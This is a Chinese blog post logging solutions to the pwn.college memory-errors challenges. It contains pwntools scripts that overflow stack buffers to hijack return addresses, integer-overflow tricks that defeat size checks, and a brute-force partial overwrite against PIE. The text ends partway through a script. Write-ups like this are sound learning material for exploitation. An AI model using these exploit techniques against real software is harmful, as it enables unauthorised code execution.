

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
  <link rel="icon" href="/image/atom1.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#153b6e">
  <meta name="author" content="郭佳明">
  <meta name="keywords" content="">
  
    <meta name="description" content="📒写在前面  4、5 涉及利用整数溢出漏洞绕过检测 7 开始开启了 pie，并且只能溢出返回地址的最后两个字节，需要用到一些页机制 8 使用 memcpy 将堆上 buf 的内容复制到栈上面 9 Canary + pie + 神奇 read 1bytes 逻辑 10 启用了 pie 和 Canary，简单格式化字符串漏洞 11 涉及 mmap 函数的内存分配，利用格式化字符串溢出漏洞 12 pi">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn college 刷题记录： memory-errors">
<meta property="og:url" content="http://gls.show/p/3bd14ce9/index.html">
<meta property="og:site_name" content="郭佳明的博客">
<meta property="og:description" content="📒写在前面  4、5 涉及利用整数溢出漏洞绕过检测 7 开始开启了 pie，并且只能溢出返回地址的最后两个字节，需要用到一些页机制 8 使用 memcpy 将堆上 buf 的内容复制到栈上面 9 Canary + pie + 神奇 read 1bytes 逻辑 10 启用了 pie 和 Canary，简单格式化字符串漏洞 11 涉及 mmap 函数的内存分配，利用格式化字符串溢出漏洞 12 pi">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://gls.show/image/pwn-college.png">
<meta property="article:published_time" content="2024-05-30T03:16:43.284Z">
<meta property="article:modified_time" content="2024-06-27T14:40:03.467Z">
<meta property="article:author" content="郭佳明">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://gls.show/image/pwn-college.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>pwn college 刷题记录： memory-errors - 郭佳明的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>郭佳明的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="pwn college 刷题记录： memory-errors"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-05-30 11:16" pubdate>
          2024年5月30日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          38k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          119 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">pwn college 刷题记录： memory-errors</h1>
            
              <p class="note note-info">
                
                  
                    <!-- compatible with older versions-->
                    本文最后更新于：2024年6月27日 晚上
                  
                
              </p>
            
            <div class="markdown-body">
              
              <h1 id="📒"><a href="#📒" class="headerlink" title="📒"></a>📒</h1><p>写在前面</p>
<ul>
<li>4、5 涉及利用整数溢出漏洞绕过检测</li>
<li>7 开始开启了 pie，并且只能溢出返回地址的最后两个字节，需要用到一些页机制</li>
<li>8 使用 memcpy 将堆上 buf 的内容复制到栈上面</li>
<li>9 Canary + pie + 神奇 read 1bytes 逻辑</li>
<li>10 启用了 pie 和 Canary，简单格式化字符串漏洞</li>
<li>11 涉及 mmap 函数的内存分配，利用格式化字符串溢出漏洞</li>
<li>12 pie+Canary+后门二次调用， 格式化字符串泄露出 Canary 然后爆破对抗 pie</li>
<li>14 很有意思的一题，像是 12+13 的结合。利用未初始化的缓冲区 leak Canary，调试获得栈上Canary 的偏移</li>
<li>15 网络程序 fork 函数调用 + Canary 泄露 + pie + ret 3 nibble。这里重点是使用多进程爆破 Canary 的过程，逻辑较复杂<h1 id="1-0"><a href="#1-0" class="headerlink" title="1-0"></a>1-0</h1></li>
</ul>
<p>直接覆盖返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level1.0&#x27;</span>)<br><br><span class="hljs-comment"># p.recvall()</span><br><br>p.send(<span class="hljs-string">b&#x27;200&#x27;</span>)<br><br><span class="hljs-comment"># p.recvall()</span><br><br><span class="hljs-comment"># 填充部分</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">70</span><br><br><span class="hljs-comment"># 基指针填充部分</span><br>base_pointer_padding = <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br><br><span class="hljs-comment"># 返回地址 0x000000000000152C</span><br>return_address = p64(<span class="hljs-number">0x152C</span>)<br><br><span class="hljs-comment"># 构造输入</span><br>payload = padding + base_pointer_padding + return_address<br><br><span class="hljs-comment"># 发送 payload</span><br>p.send(payload)<br><br><span class="hljs-comment"># 接收并打印所有数据</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure>

<h1 id="1-1"><a href="#1-1" class="headerlink" title="1-1"></a>1-1</h1><p>同上</p>
<h1 id="2-0"><a href="#2-0" class="headerlink" title="2-0"></a>2-0</h1><p>有 Canary，将对应 win variable 地址内容修改即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level2.0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># 填充部分</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">104</span><br><br><span class="hljs-comment"># 设置为 win 的值</span><br>win_value = p32(<span class="hljs-number">0x1c62f8f8</span>)<br><br><span class="hljs-comment"># 构造输入</span><br>payload = padding + win_value<br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 接收并打印所有数据</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure>

<h1 id="2-1"><a href="#2-1" class="headerlink" title="2-1"></a>2-1</h1><p>In this level, there is a “win” variable.<br>By default, the value of this variable is zero.<br>However, if you can set variable to 0x1c62f8f8, the flag will be printed.</p>
<p>• 缓冲区 v6 大小为 120 字节，位于 rsp+40h。<br>• v5 指向 v6 的第 116 字节 (<code>&amp;v6[116]</code>)。<br>• 我们需要写入 120 字节来填满缓冲区，然后覆盖 v5 指向的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象 运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level2.1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># 填充部分</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">116</span><br><br><span class="hljs-comment"># 设置为 win 的值</span><br>win_value = p32(<span class="hljs-number">0x47ba9894</span>)<br><br><span class="hljs-comment"># 构造输入</span><br>payload = padding + win_value<br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 接收并打印所有数据</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure>

<h1 id="3-0"><a href="#3-0" class="headerlink" title="3-0"></a>3-0</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__int64 v9[<span class="hljs-number">13</span>]<span class="hljs-comment">; // [rsp+30h] [rbp-80h] BYREF</span><br><br><span class="hljs-attribute">buf</span> = v9<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>覆盖</p>
<ul>
<li>缓冲区<code>8*16</code></li>
<li>前 ebp</li>
<li>返回地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Set architecture</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># Create a process object running the binary</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level3.0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># Buffer layout</span><br>buffer_size = <span class="hljs-number">8</span>*<span class="hljs-number">16</span><br>additional_padding = <span class="hljs-number">8</span><br>win_function_address = p64(<span class="hljs-number">0x401833</span>)  <br><br><span class="hljs-comment"># Constructing the payload</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * additional_padding<br>payload += win_function_address<br><br><span class="hljs-comment"># Send the payload</span><br>p.send(payload)<br><br><span class="hljs-comment"># Receive and print all data</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure>


<h1 id="3-1"><a href="#3-1" class="headerlink" title="3-1"></a>3-1</h1><p>略</p>
<h1 id="4-0"><a href="#4-0" class="headerlink" title="4-0"></a>4-0</h1><p>整数溢出。输入 -1 可以绕过大小检测，补码原理导致 read 一个大的缓冲区长度</p>
<p><code>read()</code> 函数的原型如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;<br></code></pre></td></tr></table></figure>

<p>其中:</p>
<ul>
<li><code>fd</code> 是文件描述符,表示要读取数据的文件或设备。</li>
<li><code>buf</code> 是一个指针,指向存储读取数据的缓冲区。</li>
<li><code>nbyte</code> 是要读取的最大字节数。<strong>注意它是一个无符号整数</strong></li>
</ul>
<p>绕过</p>
<ul>
<li><code>if (SLODWORD(nbytes[0]) &gt; 44)</code><ul>
<li>因为 <code>nbytes[0]</code> 是一个有符号整数，所以当其值为 -1 时（-1 显然小于 44），不会触发 exit(1) 退出程序</li>
</ul>
</li>
<li><code>v9 = read(0, buf, LODWORD(nbytes[0]));</code> 在 read() 的上下文中， size_t 参数为无符号整数（unsigned int），-1 转换为无符号整数后变成了 0xFFFFFFFF，导致 read() 函数尝试从标准输入读取高达0xFFFFFFFF数据到 buf 中，从而触发缓冲区溢出</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level4.0&#x27;</span>)<br><br><span class="hljs-comment"># 准备有效载荷</span><br>buffer_size = <span class="hljs-number">64</span><br>padding_to_ret_address = <span class="hljs-number">8</span>  <br>win_func_address = p64(<span class="hljs-number">0x40209A</span>)  <span class="hljs-comment"># 替换为实际地址</span><br><br><span class="hljs-comment"># 发送整数下溢值绕过大小检查</span><br>p.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>, <span class="hljs-string">&quot;-1&quot;</span>)<br><br><span class="hljs-comment"># 构造溢出并覆盖返回地址的有效载荷</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * padding_to_ret_address<br>payload += win_func_address<br><br> <br>p.sendline(payload)<br><br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h1 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h1><p>略</p>
<h1 id="5-0"><a href="#5-0" class="headerlink" title="5-0"></a>5-0</h1><p>防范逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v9);<br>  <span class="hljs-keyword">if</span> ( !v9 )<br>    __assert_fail(<span class="hljs-string">&quot;record_num &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8B</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v8);<br>  <span class="hljs-keyword">if</span> ( !v8 )<br>    __assert_fail(<span class="hljs-string">&quot;record_size &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8E</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v8 * v9 &gt; <span class="hljs-number">7</span> )<br>    __assert_fail(<span class="hljs-string">&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8F</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  nbytes = v8 * (<span class="hljs-keyword">unsigned</span> __int64)v9;<br>  v11 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <br></code></pre></td></tr></table></figure>


<p>对于32 位无符号整数，429496730 * 10 = 4294967300。在 32 位中，这个结果将会溢出，实际结果将是 4294967300 mod 2^32 = 4，这满足 v8 * v9 &lt;= 7，从而通过整数溢出漏洞绕过检查</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level5.0&#x27;</span>)<br><br>buffer_size = <span class="hljs-number">96</span><br>padding_to_ret_address = <span class="hljs-number">8</span>  <br>win_func_address = p64(<span class="hljs-number">0x401637</span>)  <span class="hljs-comment"># 替换为实际地址</span><br><br><span class="hljs-comment"># Send negative values correctly interpreted by your payload logic</span><br>p.sendlineafter(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>, <span class="hljs-string">&quot;429496730&quot;</span>) <br>p.sendlineafter(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>, <span class="hljs-string">&quot;10&quot;</span>)<br><br><span class="hljs-comment"># 构造溢出并覆盖返回地址的有效载荷</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * padding_to_ret_address<br>payload += win_func_address<br><br> <br>p.sendline(payload)<br><br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>


<h1 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h1><p>略</p>
<h1 id="6-0"><a href="#6-0" class="headerlink" title="6-0"></a>6-0</h1><p>直接跳转到<code>if ( a1 == 4919 )</code>的下一条语句即可</p>
<h1 id="6-1"><a href="#6-1" class="headerlink" title="6-1"></a>6-1</h1><p>略</p>
<h1 id="7-0"><a href="#7-0" class="headerlink" title="7-0"></a>7-0</h1><p>开启了 pie，并且只能溢出返回地址的最后两个字节</p>
<p>以A BCD为例，A 是页表基地址；BCD 是最后的 12 位，是页表内偏移，这个是不变的。用 ida 或者 gdb p &amp;func查看challenge 和 win两个函数，发现非常相近，有理由认为在一个页内，因此这两个函数的地址只有倒数第四个 16 进制数字是不同的</p>
<p>爆破即可，16 种情况，平均第八次即可得出答案</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">在x86-64架构中，典型的页表解析如下：<br><br><span class="hljs-bullet">1.</span> <span class="hljs-strong">**页内偏移（最后12位）：**</span> 用于在4KB页面内的偏移。 0x1000<br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**页表项索引（Page Table Entry, PTE）：**</span> 用于三级页表中的索引（9位）。<br><span class="hljs-bullet">3.</span> <span class="hljs-strong">**页目录项索引（Page Directory Entry, PDE）：**</span> 用于二级页表中的索引（9位）。<br><span class="hljs-bullet">4.</span> <span class="hljs-strong">**页目录指针表索引（Page Directory Pointer Table, PDPT）：**</span> 用于一级页表中的索引（9位）。<br><span class="hljs-bullet">5.</span> <span class="hljs-strong">**页映射层索引（Page Map Level 4, PML4）：**</span> 用于顶级页表中的索引（9位）。<br><br><span class="hljs-section">### 具体示例解析</span><br><br>以 <span class="hljs-code">`0x561dfac99059`</span> 为例：<br><br><span class="hljs-bullet">1.</span> <span class="hljs-strong">**最后12位（页内偏移）：**</span> <span class="hljs-code">`0x059`</span>。<br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**页表项索引（PTE）：**</span> <span class="hljs-code">`0x9`</span>，即二进制 <span class="hljs-code">`1001`</span>。<br><span class="hljs-bullet">3.</span> <span class="hljs-strong">**页目录项索引（PDE）：**</span> <span class="hljs-code">`0xC`</span>，即二进制 <span class="hljs-code">`1100`</span>。<br><span class="hljs-bullet">4.</span> <span class="hljs-strong">**页目录指针表索引（PDPT）：**</span> <span class="hljs-code">`0xA`</span>，即二进制 <span class="hljs-code">`1010`</span>。<br><span class="hljs-bullet">5.</span> <span class="hljs-strong">**页映射层索引（PML4）：**</span> <span class="hljs-code">`0x561df`</span>，这是一个较大的值，需要进一步拆分（假设高位部分是 <span class="hljs-code">`0x561d`</span>，后续部分 <span class="hljs-code">`f`</span> 作为低位）。<br></code></pre></td></tr></table></figure>

<p>思路</p>
<ul>
<li>覆盖最后三个十六进制数</li>
<li>爆破倒数第四个十六进制数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>: <span class="hljs-comment"># brute forcing</span><br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level7.1&#x27;</span>)<br>    <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)  <span class="hljs-comment"># 等待直到接收到特定字符串</span><br>    p.sendline(<span class="hljs-string">&#x27;74&#x27;</span>)             <span class="hljs-comment"># 发送字符串&#x27;122&#x27;，表示接下来的负载大小</span><br><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">72</span> + p64(<span class="hljs-number">0x1E63</span>)<br>    <span class="hljs-comment">#p.recvline(&#x27;Send your payload&#x27;)</span><br>    p.sendline(payload)<br><br>    <span class="hljs-comment">#p.interactive()</span><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span 